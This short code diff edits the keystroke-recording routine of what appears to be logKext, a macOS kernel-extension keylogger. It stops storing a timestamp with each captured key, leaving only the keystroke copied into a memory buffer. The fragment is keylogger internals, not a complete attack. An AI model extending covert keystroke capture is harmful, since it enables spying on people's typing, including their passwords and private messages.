@@ -311,13 +311,9 @@ void com_fsb_iokit_logKext::logStroke( unsigned key, unsigned flags, unsigned ch
 	#ifdef DEBUG
 		IOLog( "%s::Copying key %04x\n", getName(), keyData );
 	#endif
-	
-	#ifdef DEBUG
-		IOLog( "%s::%f\n", getName(), (double) ts);
-	#endif
-		
+
 	// check we have enough room in the key buffer for this event
-	if (buffsize + sizeof(ts) + sizeof(keyData) > MAX_BUFF_SIZE)
+	if (buffsize + sizeof(keyData) > MAX_BUFF_SIZE)
 	{
 		#ifdef DEBUG
 			IOLog( "%s::Error: buffer overflow\n", getName() );
@@ -326,10 +322,6 @@ void com_fsb_iokit_logKext::logStroke( unsigned key, unsigned flags, unsigned ch
 		buffsize=0;
 	}
 
-	// copy in the timestamp
-	memcpy(fMemBuf+buffsize,&ts,sizeof(ts));
-	buffsize+=sizeof(ts);
-	
 	// copy in the keystroke
 	memcpy(fMemBuf+buffsize,&keyData,sizeof(keyData));
 	buffsize+=sizeof(keyData);
